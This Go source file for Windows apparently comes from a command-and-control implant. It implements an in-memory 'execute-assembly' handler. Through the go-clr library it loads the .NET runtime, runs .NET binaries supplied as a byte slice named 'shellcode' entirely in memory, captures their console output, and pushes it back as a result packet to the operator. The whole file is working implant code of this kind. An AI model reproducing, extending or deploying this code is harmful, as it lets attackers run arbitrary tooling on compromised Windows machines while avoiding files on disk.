//go:build windows
package packet

import (
	"crypto/sha256"
	"errors"
	"fmt"
	"github.com/Ne0nd0g/go-clr"
	"log"
	"sync"
	"time"
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}

func (c *CLRInstance) GetRuntimeHost(runtime string, debug bool) *clr.ICORRuntimeHost {
	c.Lock()
	defer c.Unlock()
	if c.runtimeHost == nil {
		if debug {
			log.Printf("Initializing CLR runtime host")
		}
		c.runtimeHost, _ = clr.LoadCLR(runtime)
		err := clr.RedirectStdoutStderr()
		if err != nil {
			if debug {
				log.Printf("could not redirect stdout/stderr: %v\n", err)
			}
		}
	}
	return c.runtimeHost
}

func CleanCLR(debug bool) {
	runtimeHost := clrInstance.runtimeHost
	appDomain, err := clr.GetAppDomain(runtimeHost)
	if err != nil {
		appDomain = nil
	}

	metaHost, err := clr.CLRCreateInstance(clr.CLSID_CLRMetaHost, clr.IID_ICLRMetaHost)
	if err != nil {
		metaHost = nil
	}

	if appDomain != nil {
		if debug {
			log.Printf("release appDomain\n")
		}
		appDomain.Release()
	}
	if runtimeHost != nil {
		if debug {
			log.Printf("release runtimeHost\n")
		}
		runtimeHost.Release()
	}

	if assemblies != nil {
		for i, _ := range assemblies {
			assemblies[i].methodInfo.Release()
		}
	}

	if metaHost != nil {
		if debug {
			log.Printf("release metaHost\n")
		}
		metaHost.Release()
	}

	if debug {
		log.Printf("release assemblies\n")
	}
	assemblies = make([]*assembly, 0)
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
	assemblies = append(assemblies, asm)
}

func getAssembly(data []byte) *assembly {
	asmHash := sha256.Sum256(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash {
			return asm
		}
	}
	return nil
}

func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (string, error) {
	var (
		methodInfo *clr.MethodInfo
		err        error
	)

	rtHost := clrInstance.GetRuntimeHost(runtime, debug)
	if rtHost == nil {
		time.Sleep(time.Second)
		rtHost = clrInstance.GetRuntimeHost(runtime, debug)
		if rtHost == nil{
			return "", errors.New("Could not load CLR runtime host")
		}
	}

	//time.Sleep(time.Millisecond * 500)

	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
	} else {
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			if debug {
				log.Printf("could not load assembly: %v\n", err)
			}
			return "", err
		}
		addAssembly(methodInfo, data)
	}
	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
		// for methods like Main(String[] args), if we pass an empty string slice
		// the clr loader will not pass the argument and look for a method with
		// no arguments, which won't work
		assemblyArgs = []string{" "}
	}
	if debug {
		log.Printf("Assembly loaded, methodInfo: %+v\n", methodInfo)
		log.Printf("Calling assembly with args: %+v\n", assemblyArgs)
	}
	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
	if debug {
		log.Printf("Got output: %s\n%s\n", stdout, stderr)
	}
	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
}

func ExecuteAssembly(shellcode []byte, params []string) ([]byte, error){
	ExecuteAssemblyWithCallback(shellcode, params, func(result []byte){
		finalPacket := MakePacket(32, result)
		PushResult(finalPacket)
	})

	return []byte("Hold on"), nil
}

func ExecuteAssemblyWithCallback(shellcode []byte, params []string, callback func(result []byte)) {
	go func() {
		debug := true
		stdout, err := LoadBin(shellcode, params, "v4.8", debug)
		if err != nil {
			fmt.Printf("[DEBUG] Returned STDOUT/STDERR: \n%s\n", stdout)
			ErrorProcess(errors.New(stdout))
			ErrorProcess(err)
			return
		}
		callback([]byte(stdout))
	}()
}